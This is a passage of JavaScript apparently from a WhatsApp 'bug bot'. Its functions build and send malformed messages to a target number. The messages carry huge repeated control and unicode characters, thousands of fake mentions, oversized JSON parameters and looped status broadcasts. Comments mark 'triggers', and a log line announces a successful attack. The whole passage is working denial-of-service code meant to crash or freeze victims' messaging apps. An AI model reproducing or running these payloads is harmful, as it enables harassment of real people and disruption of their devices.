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",
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    let statusid;
    statusid = await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    await sock.relayMessage(
      target,
      {
        message: {
          protocolMessage: {
            key: statusid.key,
            limitSharing: {
              sharingLimited: true,
              trigger: "BIZ_SUPPORTS_FB_HOSTING",
            },
            type: "PEER_DATA_OPERATION_REQUEST_RESPONSE_MESSAGE",
          },
        },
      },
      {}
    );
  } catch (err) {
    console.log(err);
  }
}

async function ForceXmds(sock, target) {
  const cards = [];
  
  const media = await prepareWAMessageMedia(
    { video: { url: 'https://files.catbox.moe/dfb42j.mp4' }, 
    },
    { upload: sock.waUploadToServer }
  );

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://t.me/sockzz25",
              showAdAttribution: false // trigger 1
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 10; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) // trigger 2
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: ""
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "" + "" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              externalAdReply: {
                title: "",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://t.me/sockzz25",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}                         

async function Xmdsql(sock, target) {
  const mentionedList = Array.from({ length: 90000 }, () =>
    "250208" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
  );

  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "\u200E".repeat(3000),
            liveLocationMessage: {
              degreesLatitude: 0.0000001,
              degreesLongitude: 0.0000001,
              name: "\u2060".repeat(9000),   
              address: "\u200B".repeat(9000) 
            },
            hasMediaAttachment: false
          },
          body: {
            text: "\u200B",
            format: "DEFAULT"
          },
          footer: {
            text: "\u2060".repeat(500)
          },
          nativeFlowMessage: {
            messageParamsJson: "{}".repeat(9000)
          },
          contextInfo: {
            mentionedJid: mentionedList,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  extendedTextMessage: {
                    text: "\u200E\u2060\u200B"
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    messageId: "Jual Panel Gk-" + Math.floor(Math.random() * 9999999),
  });
}

async function trashInv(sock, target) {
  try {
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "\u0000" },
              header: {
                title: "",
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongtitude: 0
                },
                hasMediaAttachMent: true
              },
              contextInfo: {
                isForwarded: true,
                forwardingScore: 999,
                remoteJid: "status@broadcast",
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from(
                    { length: 1999 },
                    () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                  )
                ],
                externalAdReply: {
                  quotedAd: {
                    advertiserName: "\x10".repeat(600),
                    mediaType: "IMAGE",
                    jpegThumbnail: null,
                    caption: ""
                  },
                  placeholderKey: {
                    remoteJid: "0s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                  }
                }
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                      title: "ោ៝".repeat(60000)
                    })
                  }
                ],
                messageParamsJson: "{}".repeat(10000)
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        messageId: msg.key.id,
        participant: { jid: target }
      }
    );
  } catch (err) {
    console.error(err);
  }
}

async function OtaxAyunBeloved(target) {

  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " 驴Otax Here驴 ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
 
  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ]

  let sequentialIndex = 0
  console.log(chalk.red(`饾槹饾樀饾槩饾樄 饾槾饾槮饾槬饾槩饾槸饾槰 饾槷饾槮饾槸饾槰饾槳饾槼饾槳饾槷 饾槩饾樀饾樀饾槩饾槫饾槵 饾槵饾槮 ${target}`))

  const selectedMedia = mediaData[sequentialIndex]
  sequentialIndex = (sequentialIndex + 1) % mediaData.length
  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
    ],
  }

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }

  const textMsg = {
    extendedTextMessage: {
      text: "Hi Im Otax?驴" + "軎�".repeat(300000),
      contextInfo,
    },
  }

  const interMsg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "蟽骗伪讗 搔伪喙€", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }

  const statusMessages = [stickerMsg, textMsg, interMsg]
 
  const musicMeta = {
  musicContentMediaId: "589608164114571",
  songId: "870166291800508",
  author: "慰蟿伪习 喂褧 薪褦褟褦",
  title: "薪伪喂 喂屑 慰蟿伪习",
  artworkDirectPath:
    "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
  artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
  artistAttribution: "https://www.instagram.com/Otapengenkawin",
  countryBlocklist: true,
  isExplicit: true,
  artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
};

const videoMessage = {
  url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
  mimetype: "video/mp4",
  fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
  fileLength: "289511",
  seconds: 15,
  mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
  caption: "跃缘怨諆 諊跃諓e",
  height: 640,
  width: 640,
  contextInfo: {
    mentionedJid: Array.from(
      { length: 1900 },
      () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
    ),
  },
  annotations: [
    { embeddedContent: { embeddedMusic: musicMeta }, embeddedAction: true },
  ],
};

const stickMessage = {
  stickerMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
    mimetype: "image/webp",
    isAnimated: true,
    contextInfo: {
      mentionedJid: Array.from(
        { length: 2000 },
        () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
      ),
    },
  },
};

const nativeMessage = {
  interactiveResponseMessage: {
    body: { text: "喙弔喔勛� 蟼喙徯逞�", format: "DEFAULT" },
    nativeFlowResponseMessage: {
      name: "galaxy_message",
      paramsJson: "\u0000".repeat(1045000),
      version: 3,
    },
    entryPointConversionSource: "{}",
  },
  contextInfo: {
    participant: target,
    mentionedJid: Array.from(
      { length: 2000 },
      () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    ),
    quotedMessage: {
      paymentInviteMessage: {
        serviceType: 3,
        expiryTimestamp: Date.now() + 1814400000,
      },
    },
  },
};


const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const otaxmsg = generateWAMessageFromContent(target, generateMessage, {});

   
  const messages = [
  { viewOnceMessage: { message: { videoMessage } } },
  { viewOnceMessage: { message: stickMessage } },
  { viewOnceMessage: { message: nativeMessage } },
  { viewOnceMessage: { message: { musicMeta } } },
];

  let msg = null;
  for (let i = 0; i < 10; i++) {
  await sock.relayMessage("status@broadcast", otaxmsg.message, {
        messageId: otaxmsg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });    
    await sock.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
     for (const content of statusMessages) {
      const msg = generateWAMessageFromContent(target, content, {})
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      })
    }
    for (const item of messages) {
      msg = generateWAMessageFromContent(target, item, {});
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });
    }
        
    if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 4000));
  }
  }
  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " meki - melar ",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function LocaXotion(target) {
    await sock.relayMessage(
        target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 197-7728-82882,
                        degreesLongitude: -111-188839938,
                        caption: ' GROUP_MENTION ' + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                        contextInfo: {
                            forwardingScore: 177,
                            isForwarded: true,
                            quotedMessage: {
                                documentMessage: {
                                    contactVcard: true
                                }
                            },
                            groupMentions: [{
                                groupJid: "1999@newsletter",
                                groupSubject: " Subject "
                            }]
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        }
    );
}

async function Blzr(target) {
try {
const abimsalsa = "\u2063".repeat(4000);
const salsa = "\u300B".repeat(3000);

const msg1 = {  
  viewOnceMessage: {  
    message: {  
      interactiveResponseMessage: {  
        body: {  
          text: "ABIM - ANTI GEDOR",  
          format: "DEFAULT"  
        },  
        nativeFlowResponseMessage: {  
          name: "call_permission_request",  
          paramsJson: "\u0000".repeat(9000),  
          actions: [  
            { name: "galaxy_message", buttonParamsJson: "\u0005".repeat(6000) + salsa }  
          ],  
          version: 3  
        }  
      }  
    }  
  }  
};  

const msg2 = {  
  stickerMessage: {  
    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",  
    fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",  
    fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",  
    mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",  
    mimetype: "image/webp",  
    height: 9999,  
    width: 9999,  
    directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",  
    fileLength: 12260,  
    mediaKeyTimestamp: "1743832131",  
    isAnimated: false,  
    stickerSentTs: "X",  
    isAvatar: false,  
    isAiSticker: false,  
    isLottie: false,  
    contextInfo: {  
      mentionedJid: [  
        "0@s.whatsapp.net",  
        ...Array.from({ length: 1900 }, () =>  
          `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`  
        )  
      ],  
      stanzaId: "1234567890ABCDEF",  
      quotedMessage: {  
        paymentInviteMessage: {  
          serviceType: 3,  
          expiryTimestamp: Date.now() + 1814400000  
        }  
      }  
    }  
  }  
};  

const msg3 = {  
  viewOnceMessage: {  
    message: {  
      interactiveMessage: {  
        body: {  
          xternalAdReply: {  
            title: "Abimofficial",  
            text: abimsalsa  
          }  
        },  
        extendedTextMessage: {  
          text: "{".repeat(9000),  
          contextInfo: {  
            mentionedJid: Array.from(  
              { length: 2000 },  
              (_, i) => `1${i}@s.whatsapp.net`  
            )  
          }  
        },  
        businessMessageForwardInfo: {  
          businessOwnerJid: "13135550002@s.whatsapp.net"  
        },  
        nativeFlowMessage: {  
          buttons: [  
            { name: "cta_url", buttonParamsJson: "\u0005".repeat(1000) + salsa },  
            { name: "call_permission_request", buttonParamsJson: "\u0005".repeat(7000) + salsa }  
          ],  
          nativeFlowResponseMessage: {  
            name: "galaxy_message",  
            paramsJson: "\u0000".repeat(7000),  
            version: 3  
          },  
          contextInfo: {  
            mentionedJid: [  
              "0@s.whatsapp.net",  
              ...Array.from(  
                { length: 1900 },  
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`  
              )  
            ]  
          }  
        }  
      }  
    }  
  }  
};  

const msg4 = {  
  viewOnceMessage: {  
    message: {  
      interactiveResponseMessage: {  
        body: {  
          text: "Abim Mode Tawran",  
          format: "DEFAULT"  
        },  
        nativeFlowResponseMessage: {  
          name: "call_permission_request",  
          paramsJson: "\u0000".repeat(6000),  
          version: 3  
        },  
        contextInfo: {  
          participant: "0@s.whatsapp.net",  
          remoteJid: "status@broadcast",  
          mentionedJid: [  
            "0@s.whatsapp.net",  
            ...Array.from({ length: 1900 }, () =>  
              "1" + Math.floor(Math.random() * 500000).toString(16).padStart(6, "0")  
            )  
          ],  
          quotedMessage: {  
            paymentInviteMessage: {  
              serviceType: 3,  
              expiryTimeStamp: Date.now() + 1690500  
            }  
          }  
        }  
      }  
    }  
  }  
};  

const msg5 = {  
  requestPhoneNumberMessage: {  
    contextInfo: {  
      businessMessageForwardInfo: {  
        businessOwnerJid: "13135550002@s.whatsapp.net"  
      },  
      bimid: "apa an bego" + "p" + Math.floor(Math.random() * 99999),  
      forwardingScore: 100,  
      isForwarded: true,  
      forwardedNewsletterMessageInfo: {  
        newsletterJid: "120363321780349272@newsletter",  
        serverMessageId: 1,  
        newsletterName: "bim".repeat(1)  
      }  
    }  
  }  
};  

const msg6 = {  
  videoMessage: {  
    url: "https://example.com/video.mp4",  
    mimetype: "video/mp4",  
    fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",  
    fileLength: "1515940",  
    seconds: 14,  
    mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",  
    height: 1280,  
    width: 720,  
    fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",  
    directPath: "/example",  
    mediaKeyTimestamp: "1748276788",  
    contextInfo: {  
      isSampled: true,  
      mentionedJid: typeof mentionedList !== "undefined" ? mentionedList : []  
    }  
  }  
};  

const msg7 = [  
  {  
    ID: "68917910",  
    uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",  
    buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",  
    sid: "5e03e0",  
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",  
    ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",  
    mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",  
  },  
  {  
    ID: "68884987",  
    uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",  
    buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",  
    sid: "5e03e0",  
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",  
    ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",  
    mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",  
  }
]

for (const msg of [msg4, msg5, msg6]) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}  

for (const msg of [msg1, msg2, msg3]) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}  

for (const msg of msg7) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}

console.log(`Wolker Attacked Sending Bug To ${target} suksesfull`);

} catch (e) {
console.error(e);
}
}

async function SaturnHere(target) {

  const buildMetadata = () => ({
    deviceListMetadataVersion: 2,
    messageContextInfo: {
      deviceListMetadata: {
        senderTimestamp: "1762522364",
        recipientKeyHash: "Cla60tXwl/DbZw==",
        recipientTimestamp: "1763925277"
      },
      messageSecret: "QAsh/n71gYTyKcegIlMjLMiY/2cjj1Inh6Sd8ZtmTFE="
    }
  });

  const buildEvent = () => {
    const longSpam =
      "Sharfinā1st 永遠に生きる" +
      "ꦾ".repeat(50000) +
      "ꦽ".repeat(50000);

    return {
      eventMessage: {
        name: "</> Saturn",
        isCanceled: true,
        isScheduleCall: true,
        extraGuestsAllowed: true,
        startTime: "1764032400",
        contextInfo: {
